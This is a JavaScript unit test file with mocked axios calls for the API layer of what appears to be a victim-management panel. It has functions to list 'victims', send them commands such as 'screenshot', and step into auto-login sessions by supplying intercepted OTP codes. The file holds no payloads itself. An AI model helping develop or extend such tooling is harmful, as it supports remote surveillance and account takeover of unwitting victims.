/**
 * Unit Tests for API Service
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import axios from 'axios';
import { autoLoginAPI, victimAPI, accessHistoryAPI, systemAPI } from '../../services/apiService';

// Mock axios
vi.mock('axios');
const mockedAxios = vi.mocked(axios, true);

describe('API Service', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Mock localStorage
    Object.defineProperty(window, 'localStorage', {
      value: {
        getItem: vi.fn(),
        setItem: vi.fn(),
        removeItem: vi.fn(),
      },
      writable: true,
    });
  });

  describe('autoLoginAPI', () => {
    it('should get auto login requests', async () => {
      const mockData = [{ id: 'AL001', status: 'pending' }];
      mockedAxios.create.mockReturnValue({
        get: vi.fn().mockResolvedValue({ data: mockData }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await autoLoginAPI.getRequests();
      expect(result).toBeDefined();
    });

    it('should create auto login request', async () => {
      const mockResponse = { success: true, id: 'AL002' };
      mockedAxios.create.mockReturnValue({
        post: vi.fn().mockResolvedValue({ data: mockResponse }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await autoLoginAPI.createRequest({
        website: 'example.com',
        username: 'test@example.com'
      });
      expect(result).toBeDefined();
    });

    it('should handle intervention', async () => {
      const mockResponse = { success: true, message: 'OTP sent' };
      mockedAxios.create.mockReturnValue({
        post: vi.fn().mockResolvedValue({ data: mockResponse }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await autoLoginAPI.intervention('AL001', 'provide_otp', { otp: '123456' });
      expect(result).toBeDefined();
    });
  });

  describe('victimAPI', () => {
    it('should get victims list', async () => {
      const mockData = [{ id: 'V001', status: 'online' }];
      mockedAxios.create.mockReturnValue({
        get: vi.fn().mockResolvedValue({ data: mockData }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await victimAPI.getVictims();
      expect(result).toBeDefined();
    });

    it('should send command to victim', async () => {
      const mockResponse = { success: true, result: 'Command executed' };
      mockedAxios.create.mockReturnValue({
        post: vi.fn().mockResolvedValue({ data: mockResponse }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await victimAPI.sendCommand('V001', 'screenshot');
      expect(result).toBeDefined();
    });
  });

  describe('systemAPI', () => {
    it('should get system stats', async () => {
      const mockStats = { totalVictims: 10, onlineVictims: 5 };
      mockedAxios.create.mockReturnValue({
        get: vi.fn().mockResolvedValue({ data: mockStats }),
        interceptors: {
          request: { use: vi.fn() },
          response: { use: vi.fn() }
        }
      });

      const result = await systemAPI.getStats();
      expect(result).toBeDefined();
    });
  });
});
